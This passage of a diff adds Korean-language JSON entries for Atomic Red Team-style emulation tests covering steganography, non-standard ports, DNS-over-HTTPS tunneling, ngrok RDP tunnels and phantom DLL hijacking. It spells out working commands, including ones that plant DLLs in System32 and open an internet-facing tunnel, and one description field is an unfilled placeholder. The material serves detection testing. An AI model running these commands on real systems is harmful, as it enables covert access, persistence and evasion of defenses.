@@ -20385,6 +20385,1440 @@
       }
     }
   ]
+},
+{
+  "technique_id": "T1001.002",
+  "technique_name": "Data Obfuscation via Steganography",
+  "tactic": "Exfiltration",
+
+  "description": "이 ATT&CK 기법이 무엇을 의미하는지,\n공격자가 어떤 목적(지속성, 유출, 권한 상승 등)으로 사용하는지,\n대표적인 방법이 무엇인지 짧게 요약.",
+
+  "tests": [
+    {
+      "test_id": "T1001.002-1",
+      "name": "Steganographic Tarball Embedding",
+      "platforms": ["windows"],
+
+      "summary": "이미지 파일과 tar 아카이브를 사용해 데이터를 은닉하는 스테가노그래피 기반 데이터 유출 시나리오를 시뮬레이션한다. 랜덤 패스워드를 생성해 tar 파일에 저장한 뒤, 이미지 바이트와 이어붙여 새로운 이미지 파일을 만든다.",
+
+      "procedure": [
+        "이미지 파일 존재 여부를 확인하거나 원격에서 다운로드한다.",
+        "랜덤 패스워드를 여러 개 생성해 텍스트 파일로 저장한다.",
+        "패스워드 파일을 포함하는 tar 아카이브를 생성한다.",
+        "원본 이미지와 tar 파일을 바이트 단위로 이어붙여 새로운 이미지를 만든다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "Get-Content <image_file>, <tar_file> -Encoding byte -ReadCount 0 | Set-Content <new_image_file> -Encoding byte"
+        }
+      ],
+
+      "prerequisites": [
+        "지정된 경로에 사용할 이미지 파일이 존재해야 한다 (없으면 원격에서 다운로드).",
+        "랜덤 패스워드를 생성해 <passwords_file>에 저장해야 한다.",
+        "<passwords_file>을 포함하는 tar 아카이브(<tar_file>)가 생성되어 있어야 한다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%TEMP%\\random_passwords.txt",
+            "description": "랜덤 패스워드를 여러 개 저장한 텍스트 파일"
+          },
+          {
+            "path": "%PUBLIC%\\Downloads\\T1001.002.tarz",
+            "description": "패스워드 텍스트를 포함하는 tar 아카이브"
+          },
+          {
+            "path": "%PUBLIC%\\Downloads\\T1001.002New.jpg",
+            "description": "데이터가 은닉된 새 이미지 파일"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "PathToAtomicsFolder\\T1001.002\\bin\\T1001.002.jpg",
+            "description": "기본 이미지 파일"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "테스트 실행에 사용된 PowerShell 프로세스",
+            "commandline_pattern": "Get-Content * -Encoding byte -ReadCount 0 | Set-Content *"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "생성된 새 이미지 파일(<new_image_file>)을 삭제할 수 있다.",
+        "테스트용 tar 및 패스워드 파일을 삭제해 흔적을 줄일 수 있다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "c7921449-8b62-4c4d-8a83-d9281ac0190b"
+      }
+    }
+  ]
+},{
+  "technique_id": "T1571",
+  "technique_name": "Non-Standard Port",
+  "tactic": "Command and Control",
+
+  "description": "비표준 포트 사용 기법은 HTTP(80), HTTPS(443) 등 일반 서비스 포트가 아닌 포트를 통해 C2 통신이나 데이터 유출을 수행하는 것을 의미한다. 공격자는 방화벽 정책이나 모니터링 우회를 위해 잘 사용되지 않는 포트를 선택해 트래픽을 숨기거나 정상 서비스로 위장한다. 이 기법은 주로 원격 제어, 비인가 서비스 운영, 은닉된 터널링에 활용된다.",
+
+  "tests": [
+    {
+      "test_id": "T1571-1",
+      "name": "Testing usage of uncommonly used port with PowerShell",
+      "platforms": ["windows"],
+
+      "summary": "PowerShell의 Test-NetConnection cmdlet을 활용해 잘 사용되지 않는 포트에 대한 네트워크 연결을 시도하는 시나리오이다. 공격자가 8081과 같은 비표준 포트로 텔넷/C2 통신을 시도하는 행위를 모사한다. 실행 결과로 대상 호스트와 포트에 대한 연결 성공 여부 및 네트워크 세부 정보가 출력된다.",
+
+      "procedure": [
+        "대상 호스트 도메인(<domain>)과 사용할 비표준 포트 번호(<port>)를 결정한다.",
+        "PowerShell을 실행한다.",
+        "Test-NetConnection -ComputerName <domain> -Port <port> 명령을 실행한다.",
+        "명령 실행 결과로 출력되는 TCP 테스트 결과, 응답 여부, 라운드 트립 시간 등을 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "Test-NetConnection -ComputerName <domain> -Port <port>"
+        }
+      ],
+
+      "prerequisites": [
+        "테스트를 수행할 Windows 환경에 PowerShell이 설치되어 있어야 한다.",
+        "대상 도메인(<domain>)이 DNS로 해석 가능해야 하며, 네트워크적으로 도달 가능한 상태여야 한다.",
+        "지정한 비표준 포트(<port>)가 방화벽에 의해 완전히 차단되어 있지 않은 환경에서 테스트하는 것이 바람직하다."
+      ],
+
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "비표준 포트에 대한 네트워크 연결 테스트를 수행하는 PowerShell 프로세스",
+            "commandline_pattern": "Test-NetConnection -ComputerName * -Port *"
+          }
+        ],
+        "network": [
+          {
+            "remote_address": "<domain>",
+            "port": "<port>",
+            "protocol": "TCP",
+            "description": "PowerShell Test-NetConnection을 통해 비표준 포트로 시도된 아웃바운드 연결"
+          }
+        ]
+      },
+
+      "cleanup": [
+        "이 테스트는 디스크 아티팩트를 생성하지 않으므로 별도의 정리 작업은 필요하지 않다.",
+        "PowerShell 세션을 종료해 프로세스를 정리할 수 있다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "21fe622f-8e53-4b31-ba83-6d333c2583f4"
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1572",
+  "technique_name": "Protocol Tunneling",
+  "tactic": "Command and Control",
+
+  "description": "프로토콜 터널링은 한 프로토콜을 다른 프로토콜 내부에 캡슐화해 우회 통신을 수행하는 기법이다. 공격자는 DNS, HTTPS, 개발 터널링 도구 등을 활용해 C2 채널이나 데이터 유출 채널을 정상 트래픽처럼 위장한다. 이 기법은 방화벽, 프록시, IDS/IPS 등의 정책을 우회하거나, 모니터링에 잘 포착되지 않는 은닉 통신 경로를 확보하는 데 활용된다.",
+
+  "tests": [
+    {
+      "test_id": "T1572-1",
+      "name": "DNS over HTTPS Large Query Volume",
+      "platforms": ["windows"],
+
+      "summary": "감염된 호스트가 DNS over HTTPS(DoH)를 이용해 대량의 DNS 쿼리를 전송하는 상황을 시뮬레이션한다. 단일 호스트에서 특정 도메인으로 매우 많은 DoH 요청을 보내 임계치 기반 탐지를 트리거하는 것을 목표로 한다. 각 요청에 대해 도메인에 대한 DNS 정보가 JSON 형식으로 반환된다.",
+
+      "procedure": [
+        "시뮬레이션에 사용할 DoH 서버 URL(<doh_server>), 기본 도메인(<domain>), 서브도메인(<subdomain>), 쿼리 타입(<query_type>), 전송할 쿼리 수(<query_volume>)를 결정한다.",
+        "PowerShell 콘솔을 연다.",
+        "for($i=0; $i -le <query_volume>; $i++) 루프를 사용해 Invoke-WebRequest로 DoH 서버에 반복적으로 요청을 전송한다.",
+        "각 요청에 대해 반환되는 DNS 응답(JSON)을 확인하고, 네트워크 모니터링 시스템에서 비정상적인 DoH 트래픽 패턴이 탐지되는지 관찰한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "for($i=0; $i -le <query_volume>; $i++) { (Invoke-WebRequest \"<doh_server>?name=<subdomain>.$(Get-Random -Minimum 1 -Maximum 999999).<domain>&type=<query_type>\" -UseBasicParsing).Content }"
+        }
+      ],
+
+      "prerequisites": [
+        "테스트를 수행할 Windows 호스트에 PowerShell이 설치되어 있어야 한다.",
+        "지정한 DoH 서버(<doh_server>)로의 HTTPS 통신이 네트워크/프록시/방화벽에서 허용되어야 한다.",
+        "시뮬레이션에 사용할 도메인(<domain>)이 DNS 상에서 유효하며, 실험 환경의 정책에 위배되지 않는 도메인이어야 한다.",
+        "대량의 DoH 요청이 보안 모니터링 시스템(예: DNS 로그 수집, 프록시 로그)에 기록되는 환경에서 수행하는 것이 탐지 테스트에 유리하다."
+      ],
+
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "대량의 DNS over HTTPS 요청을 보내는 PowerShell 프로세스",
+            "commandline_pattern": "for($i=0; $i -le *; $i++) { (Invoke-WebRequest * -UseBasicParsing).Content }"
+          }
+        ],
+        "network": [
+          {
+            "remote_address": "<doh_server>",
+            "port": "443",
+            "protocol": "HTTPS",
+            "description": "랜덤 서브도메인을 포함한 TXT 쿼리를 대량으로 전송하는 DNS over HTTPS 트래픽"
+          }
+        ]
+      },
+
+      "cleanup": [
+        "이 테스트는 기본적으로 디스크에 파일을 생성하지 않으므로 별도의 클린업 작업이 필요하지 않다.",
+        "테스트 종료 후 PowerShell 세션을 종료해 관련 프로세스를 정리한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "ae9ef4b0-d8c1-49d4-8758-06206f19af0a"
+      }
+    },
+    {
+      "test_id": "T1572-2",
+      "name": "DNS over HTTPS Regular Beaconing",
+      "platforms": ["windows"],
+
+      "summary": "감염된 호스트가 DNS over HTTPS를 통해 주기적으로 C2 서버에 비콘을 보내는 행위를 시뮬레이션한다. 일정 시간(runtime) 동안, 기본 인터벌(c2_interval)과 지터(c2_jitter)를 적용해 변동 간격으로 DoH 쿼리를 전송한다. 이는 저빈도·장기적인 C2 통신 패턴을 탐지하는 데 유용하다.",
+
+      "procedure": [
+        "PathToAtomicsFolder로 지정된 경로 아래에 T1572\\src\\T1572-doh-beacon.ps1 스크립트가 존재하는지 확인한다.",
+        "PowerShell을 실행한 뒤 Set-Location \"PathToAtomicsFolder\"를 통해 Atomic Red Team 루트 경로로 이동한다.",
+        "T1572-doh-beacon.ps1 스크립트를 DoH 서버(<doh_server>), 도메인(<domain>), 서브도메인(<subdomain>), 쿼리 타입(<query_type>), C2 인터벌(<c2_interval>), 지터(<c2_jitter>), 실행 시간(<runtime>) 파라미터와 함께 실행한다.",
+        "지정된 시간 동안 주기적으로 발생하는 DoH 비콘 트래픽과 각 호출에 대한 DNS 응답(JSON)을 모니터링한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer <doh_server> -Domain <domain> -Subdomain <subdomain> -QueryType <query_type> -C2Interval <c2_interval> -C2Jitter <c2_jitter> -RunTime <runtime>"
+        }
+      ],
+
+      "prerequisites": [
+        "PathToAtomicsFolder\\T1572\\src\\T1572-doh-beacon.ps1 파일이 존재해야 한다.",
+        "PowerShell 스크립트 실행 정책이 해당 스크립트 실행을 허용하도록 설정되어 있어야 한다(예: ExecutionPolicy 우회 또는 적절한 정책 설정).",
+        "DoH 서버(<doh_server>)와의 HTTPS 통신이 허용되어야 한다.",
+        "지정한 런타임(<runtime>) 동안 테스트를 유지할 수 있는 환경(랩/테스트 네트워크)에서 실행하는 것이 권장된다."
+      ],
+
+      "artifacts": {
+        "files_created": [],
+        "files_read": [
+          {
+            "path": "PathToAtomicsFolder\\T1572\\src\\T1572-doh-beacon.ps1",
+            "description": "주기적인 DoH 비콘 트래픽을 생성하는 PowerShell 스크립트"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "T1572-doh-beacon.ps1 스크립트를 실행해 DNS over HTTPS 비콘을 전송하는 프로세스",
+            "commandline_pattern": "*T1572-doh-beacon.ps1 -DohServer * -Domain * -Subdomain * -QueryType * -C2Interval * -C2Jitter * -RunTime *"
+          }
+        ],
+        "network": [
+          {
+            "remote_address": "<doh_server>",
+            "port": "443",
+            "protocol": "HTTPS",
+            "description": "C2Interval와 C2Jitter가 반영된 간격으로 발생하는 DNS over HTTPS 비콘 트래픽"
+          }
+        ]
+      },
+
+      "cleanup": [
+        "테스트 종료 후 PowerShell 세션을 종료해 스크립트 실행을 중단한다.",
+        "필요 시 DoH 비콘 탐지 실험에 사용한 로그(프록시 로그, DNS 로그 등)를 별도 보관하거나 삭제 정책에 따라 정리한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "0c5f9705-c575-42a6-9609-cbbff4b2fc9b"
+      }
+    },
+    {
+      "test_id": "T1572-3",
+      "name": "DNS over HTTPS Long Domain Query",
+      "platforms": ["windows"],
+
+      "summary": "긴 도메인 이름을 사용해 DNS over HTTPS 쿼리를 전송하는 시나리오를 시뮬레이션한다. 서브도메인을 최대 길이(63바이트)에 가깝게 설정하고, 이를 포함한 도메인으로 DoH 요청을 보내 데이터 반환/유출 패턴을 모사한다. 긴 도메인 이름 기반 DoH 트래픽에 대한 탐지 임계값과 룰을 검증하는 데 활용된다.",
+
+      "procedure": [
+        "PathToAtomicsFolder\\T1572\\src\\T1572-doh-domain-length.ps1 스크립트가 존재하는지 확인한다.",
+        "실험에 사용할 DoH 서버(<doh_server>), 기본 도메인(<domain>), 63자 길이에 가까운 서브도메인(<subdomain>), 쿼리 타입(<query_type>)을 설정한다.",
+        "PowerShell에서 Set-Location \"PathToAtomicsFolder\" 명령으로 Atomic Red Team 루트 경로로 이동한다.",
+        "T1572-doh-domain-length.ps1 스크립트를 위 파라미터와 함께 실행해 점점 길어지는 도메인 이름을 포함한 DoH 쿼리를 전송한다.",
+        "네트워크 모니터링 도구에서 도메인 길이가 비정상적으로 긴 DoH 요청이 탐지되는지 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer <doh_server> -Domain <domain> -Subdomain <subdomain> -QueryType <query_type>"
+        }
+      ],
+
+      "prerequisites": [
+        "PathToAtomicsFolder\\T1572\\src\\T1572-doh-domain-length.ps1 파일이 존재해야 한다.",
+        "PowerShell 스크립트 실행 정책이 해당 스크립트 실행을 허용하도록 설정되어 있어야 한다.",
+        "DoH 서버(<doh_server>)와의 통신이 네트워크 상에서 허용되어야 한다.",
+        "긴 도메인 이름 기반 트래픽을 모니터링·분석할 수 있는 DNS/프록시/보안 로그 환경이 갖추어져 있으면 좋다."
+      ],
+
+      "artifacts": {
+        "files_created": [],
+        "files_read": [
+          {
+            "path": "PathToAtomicsFolder\\T1572\\src\\T1572-doh-domain-length.ps1",
+            "description": "긴 도메인 이름을 포함한 DNS over HTTPS 쿼리를 생성하는 PowerShell 스크립트"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "T1572-doh-domain-length.ps1 스크립트를 실행해 긴 도메인 기반 DoH 트래픽을 생성하는 프로세스",
+            "commandline_pattern": "*T1572-doh-domain-length.ps1 -DohServer * -Domain * -Subdomain * -QueryType *"
+          }
+        ],
+        "network": [
+          {
+            "remote_address": "<doh_server>",
+            "port": "443",
+            "protocol": "HTTPS",
+            "description": "도메인 길이를 점진적으로 증가시키며 전송되는 DNS over HTTPS 쿼리 트래픽"
+          }
+        ]
+      },
+
+      "cleanup": [
+        "실험 종료 후 PowerShell 세션을 종료한다.",
+        "테스트에 사용된 로그를 보존 또는 삭제 정책에 따라 정리한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "748a73d5-cea4-4f34-84d8-839da5baa99c"
+      }
+    },
+    {
+      "test_id": "T1572-4",
+      "name": "Run ngrok Tunnel",
+      "platforms": ["windows"],
+
+      "summary": "ngrok을 다운로드 및 실행하여 로컬 포트(기본값 3389, RDP)에 대한 TCP 터널을 인터넷으로 노출하는 시나리오를 시뮬레이션한다. 공격자는 이를 통해 방화벽·NAT 뒤에 있는 내부 시스템에 원격으로 접근할 수 있는 C2/원격 제어 채널을 구성할 수 있다.",
+
+      "procedure": [
+        "테스트에 사용할 ngrok API 토큰(<api_token>), 터널로 노출할 로컬 포트 번호(<port_num>), ngrok 다운로드 URL(<download>)을 준비한다.",
+        "사전 조건을 실행해 C:\\Users\\Public\\ngrok 디렉터리가 존재하고, 해당 위치에 ngrok 실행 파일이 다운로드·압축 해제되어 있는지 확인한다(없으면 Invoke-WebRequest와 Expand-Archive로 자동 준비).",
+        "PowerShell에서 C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken <api_token> 명령을 통해 인증 토큰을 설정한다.",
+        "Start-Job을 사용해 ngrok.exe tcp <port_num> 명령을 백그라운드 잡으로 실행하여 TCP 터널을 생성한다.",
+        "잠시 대기한 후(Start-Sleep), 필요 시 Start-Job으로 생성된 잡을 중지하고 테스트를 종료한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken <api_token> | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp <port_num> } | Out-Null\nStart-Sleep -s 5\nStop-Job -Name Job1 | Out-Null"
+        }
+      ],
+
+      "prerequisites": [
+        "테스트에 사용할 유효한 ngrok API 토큰(<api_token>)을 보유하고 있어야 한다.",
+        "사전 준비 단계에서 C:\\Users\\Public\\ngrok 경로에 ngrok ZIP 파일을 다운로드하고, Expand-Archive로 압축을 해제해야 한다.",
+        "ngrok이 통신할 수 있도록 외부 인터넷 접속이 허용되어야 하며, ngrok 서비스 도메인(예: *.ngrok.io)으로의 접속이 차단되지 않아야 한다.",
+        "노출할 로컬 포트(<port_num>)에 실제로 서비스(RDP 등)가 동작 중이어야 터널을 통해 접속이 가능하다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "C:\\Users\\Public\\ngrok",
+            "description": "ngrok 실행 파일과 관련 아티팩트를 저장하는 디렉터리"
+          },
+          {
+            "path": "C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip",
+            "description": "ngrok 배포 ZIP 파일 (사전 준비 단계에서 다운로드)"
+          },
+          {
+            "path": "C:\\Users\\Public\\ngrok\\ngrok.exe",
+            "description": "터널 생성에 사용되는 ngrok 실행 파일"
+          },
+          {
+            "path": "%USERPROFILE%\\AppData\\Local\\ngrok",
+            "description": "ngrok 설정 및 상태 정보를 저장하는 로컬 설정 디렉터리(존재할 경우)"
+          }
+        ],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "ngrok.exe",
+            "description": "로컬 포트를 외부로 터널링하는 ngrok 프로세스",
+            "commandline_pattern": "ngrok.exe tcp *"
+          },
+          {
+            "name": "powershell.exe",
+            "description": "ngrok 다운로드, 설정 및 Start-Job을 수행하는 PowerShell 프로세스",
+            "commandline_pattern": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken *"
+          }
+        ],
+        "network": [
+          {
+            "remote_address": "<ngrok_service>",
+            "port": "443",
+            "protocol": "HTTPS",
+            "description": "ngrok 제어 채널 및 터널 관리 트래픽"
+          },
+          {
+            "remote_address": "<assigned_tunnel_endpoint>",
+            "port": "<random_high_port>",
+            "protocol": "TCP",
+            "description": "외부에서 ngrok 터널 엔드포인트를 통해 내부 포트(<port_num>)로 라우팅되는 연결"
+          }
+        ]
+      },
+
+      "cleanup": [
+        "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore 명령으로 ngrok 디렉터리와 관련 파일을 삭제한다.",
+        "Remove-Item %USERPROFILE%\\AppData\\Local\\ngrok -ErrorAction Ignore 명령으로 로컬 ngrok 설정 디렉터리를 제거한다.",
+        "실행 중인 ngrok 관련 PowerShell 잡이나 프로세스가 남아 있지 않은지 확인하고, 필요 시 수동으로 종료한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "4cdc9fc7-53fb-4894-9f0c-64836943ea60"
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1574.001",
+  "technique_name": "Hijack Execution Flow: DLL",
+  "tactic": "Privilege Escalation",
+
+  "description": "DLL 하이재킹은 애플리케이션의 DLL 검색 순서 또는 로딩 메커니즘을 악용해 공격자가 지정한 DLL을 먼저 로드하도록 만드는 기법이다. 이를 통해 정상 프로세스 컨텍스트에서 임의 코드를 실행하거나, 보안 기능(예: AMSI)을 우회하고, 시스템/사용자 권한을 상승시키는 데 활용된다. Phantom DLL, 사이드로딩, 환경 변수 기반 로딩 등 다양한 변종이 존재한다.",
+
+  "tests": [
+    {
+      "test_id": "T1574.001-1",
+      "name": "DLL Search Order Hijacking - amsi.dll",
+      "platforms": ["windows"],
+
+      "summary": "PowerShell 실행 파일을 다른 이름(updater.exe)으로 복사하고 동일 디렉터리에 amsi.dll을 배치해 검색 순서를 악용하는 DLL 검색 순서 하이재킹 시나리오이다. 비표준 경로에서 amsi.dll을 로드하도록 유도해 AMSI 우회 가능성을 검증한다.",
+
+      "procedure": [
+        "%windir%\\System32\\windowspowershell\\v1.0\\powershell.exe를 %APPDATA%\\updater.exe로 복사한다.",
+        "%windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사해 updater.exe와 같은 디렉터리에 둔다.",
+        "%APPDATA%\\updater.exe -Command exit 를 실행해 검색 순서에 따라 %APPDATA%\\amsi.dll이 로드되는지 확인한다.",
+        "DFIR 관점에서 새 위치의 updater.exe 및 amsi.dll 생성 여부와 해당 경로에서의 모듈 로딩 흔적을 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\r\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\n%APPDATA%\\updater.exe -Command exit"
+        }
+      ],
+
+      "prerequisites": [
+        "테스트를 수행하는 시스템에 PowerShell이 기본 경로(%windir%\\System32\\windowspowershell\\v1.0\\powershell.exe)에 존재해야 한다.",
+        "%windir%\\System32\\amsi.dll 파일이 존재해야 한다.",
+        "%APPDATA% 경로에 파일을 쓰기 위한 권한(일반적으로 현재 사용자 권한)이 필요하다.",
+        "updater.exe 실행 시 AMSI 관련 모듈 로딩이 발생하는 환경에서 수행하는 것이 우회 여부 확인에 유리하다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%APPDATA%\\updater.exe",
+            "description": "원본 powershell.exe를 복사해 만든 실행 파일로, 비표준 경로에서 amsi.dll을 로드하는 데 사용된다."
+          },
+          {
+            "path": "%APPDATA%\\amsi.dll",
+            "description": "DLL 검색 순서 하이재킹을 위해 %APPDATA% 경로에 복사된 amsi.dll"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "%windir%\\System32\\windowspowershell\\v1.0\\powershell.exe",
+            "description": "%APPDATA%\\updater.exe로 복사되는 원본 PowerShell 실행 파일"
+          },
+          {
+            "path": "%windir%\\System32\\amsi.dll",
+            "description": "%APPDATA%\\amsi.dll로 복사되는 원본 AMSI 라이브러리"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "updater.exe",
+            "description": "powershell.exe를 복사·이름 변경한 프로세스로, 자신의 디렉터리에서 amsi.dll을 우선 로드하려고 시도한다.",
+            "commandline_pattern": "%APPDATA%\\updater.exe -Command exit"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "%APPDATA%\\updater.exe 파일을 삭제한다.",
+        "%APPDATA%\\amsi.dll 파일을 삭제한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3"
+      }
+    },
+    {
+      "test_id": "T1574.001-2",
+      "name": "Phantom DLL Hijacking - WinAppXRT.dll",
+      "platforms": ["windows"],
+
+      "summary": ".NET 구성 요소가 APPX_PROCESS 환경 변수를 참조해 WinAppXRT.dll을 로드하는 동작을 악용하는 팬텀 DLL 하이재킹 시나리오이다. amsi.dll을 기반으로 한 WinAppXRT.dll을 사용자 프로파일 및 system32 경로에 배치하고 APPX_PROCESS 값을 설정하여, .NET 애플리케이션 실행 시 공격자가 지정한 DLL을 자동 로드하도록 유도한다.",
+
+      "procedure": [
+        "%windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사한다.",
+        "%APPDATA%\\amsi.dll 파일 이름을 WinAppXRT.dll로 변경한다.",
+        "변경된 %APPDATA%\\WinAppXRT.dll을 %windir%\\System32\\WinAppXRT.dll로 복사한다.",
+        "reg add 명령을 사용해 HKEY_CURRENT_USER\\Environment 키에 APPX_PROCESS 값(REG_EXPAND_SZ, 데이터 \"1\")을 추가한다.",
+        ".NET 기반 애플리케이션을 실행해 WinAppXRT.dll이 system32 및 PATH 상 위치에서 로드되는지 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\nren %APPDATA%\\amsi.dll WinAppXRT.dll\r\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\r\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f"
+        }
+      ],
+
+      "prerequisites": [
+        "%windir%\\System32\\amsi.dll이 존재해야 한다.",
+        "%APPDATA% 및 %windir%\\System32 경로에 파일을 쓰고 복사할 수 있는 권한(관리자 권한)이 필요하다.",
+        "HKEY_CURRENT_USER\\Environment 키에 값을 추가할 수 있어야 한다.",
+        "테스트 후 .NET 애플리케이션을 실행해 WinAppXRT.dll 로딩 동작을 관찰할 수 있는 환경이 필요하다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%APPDATA%\\WinAppXRT.dll",
+            "description": "amsi.dll에서 이름을 변경해 생성된 팬텀 WinAppXRT.dll"
+          },
+          {
+            "path": "%windir%\\System32\\WinAppXRT.dll",
+            "description": ".NET 애플리케이션 실행 시 PATH 상에서 로드될 수 있는 위치에 복사된 WinAppXRT.dll"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "%windir%\\System32\\amsi.dll",
+            "description": "팬텀 WinAppXRT.dll을 만들기 위해 복사되는 원본 amsi.dll"
+          }
+        ],
+        "registry_keys": [
+          {
+            "path": "HKEY_CURRENT_USER\\Environment",
+            "description": "APPX_PROCESS 환경 변수가 추가된 레지스트리 키"
+          }
+        ],
+        "processes": [
+          {
+            "name": "cmd.exe",
+            "description": "copy, ren, reg add 명령을 통해 DLL 및 레지스트리 조작을 수행하는 명령 프롬프트",
+            "commandline_pattern": "copy %windir%\\System32\\amsi.dll * ren %APPDATA%\\amsi.dll WinAppXRT.dll * reg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS *"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "reg delete \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /f 명령으로 APPX_PROCESS 값을 제거한다.",
+        "%windir%\\System32\\WinAppXRT.dll 파일을 삭제한다.",
+        "%APPDATA%\\WinAppXRT.dll 파일을 삭제한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "46ed938b-c617-429a-88dc-d49b5c9ffedb"
+      }
+    },
+    {
+      "test_id": "T1574.001-3",
+      "name": "Phantom DLL Hijacking - ualapi.dll",
+      "platforms": ["windows"],
+
+      "summary": "인쇄 스풀러(Print Spooler) 서비스가 시작될 때 system32의 ualapi.dll을 로드하는 동작을 악용하는 팬텀 DLL 하이재킹 시나리오이다. amsi.dll을 ualapi.dll로 위장해 system32에 배치하고 Spooler 서비스를 자동 시작으로 설정하여, 시스템 시작 시 악성 ualapi.dll이 로드되도록 한다.",
+
+      "procedure": [
+        "%windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사한다.",
+        "%APPDATA%\\amsi.dll 파일 이름을 ualapi.dll로 변경한다.",
+        "변경된 %APPDATA%\\ualapi.dll을 %windir%\\System32\\ualapi.dll로 복사한다.",
+        "sc config Spooler start=auto 명령을 실행해 Print Spooler 서비스를 자동 시작으로 설정한다.",
+        "시스템 재부팅 후 또는 Spooler 서비스 재시작 시 system32\\ualapi.dll이 로드되는지 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\nren %APPDATA%\\amsi.dll ualapi.dll\r\ncopy %APPDATA%\\ualapi.dll %windir%\\System32\\ualapi.dll\r\nsc config Spooler start=auto"
+        }
+      ],
+
+      "prerequisites": [
+        "%windir%\\System32\\amsi.dll이 존재해야 한다.",
+        "%APPDATA% 및 %windir%\\System32에 파일을 작성할 수 있는 관리자 권한이 필요하다.",
+        "sc 명령으로 Spooler 서비스 구성을 변경할 수 있어야 한다.",
+        "시스템 재부팅 또는 Spooler 서비스 재시작이 가능한 테스트 환경이어야 한다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%APPDATA%\\ualapi.dll",
+            "description": "amsi.dll을 이름 변경해 생성된 팬텀 ualapi.dll"
+          },
+          {
+            "path": "%windir%\\System32\\ualapi.dll",
+            "description": "시스템 시작/Spooler 시작 시 로드될 수 있도록 system32에 배치된 ualapi.dll"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "%windir%\\System32\\amsi.dll",
+            "description": "팬텀 ualapi.dll을 만들기 위해 복사되는 원본 amsi.dll"
+          }
+        ],
+        "registry_keys": [
+          {
+            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler",
+            "description": "sc config 명령에 의해 시작 유형(Start)이 auto로 설정된 인쇄 스풀러 서비스 구성 키"
+          }
+        ],
+        "processes": [
+          {
+            "name": "cmd.exe",
+            "description": "copy, ren, sc config 명령을 실행하는 명령 프롬프트",
+            "commandline_pattern": "copy %windir%\\System32\\amsi.dll * ren %APPDATA%\\amsi.dll ualapi.dll * sc config Spooler start=auto"
+          }
+        ],
+        "network": []
